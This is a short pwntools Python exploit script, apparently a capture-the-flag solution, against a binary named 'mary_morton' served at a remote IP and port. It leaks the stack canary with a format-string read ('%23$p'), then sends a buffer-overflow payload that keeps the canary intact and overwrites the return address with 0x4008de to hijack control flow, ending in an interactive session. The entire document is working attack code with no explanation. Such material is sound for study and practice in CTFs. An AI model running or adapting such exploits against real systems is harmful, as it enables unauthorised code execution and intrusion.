#!/usr/bin/env python
from pwn import *

#sh = process("./mary_morton")
sh = remote("111.198.29.45",52128)
context.log_level = 'debug'

sh.recv()

sh.sendline('2')
sh.sendline("%23$p")
sh.recvuntil('0x')

canary = sh.recv(16)
canary = p64(int('0x'+canary,16))
sh.sendline('1')
payload = "a"*0x88 + canary + 'a'*8 + p64(0x4008de)
sh.sendline(payload)
sh.interactive()

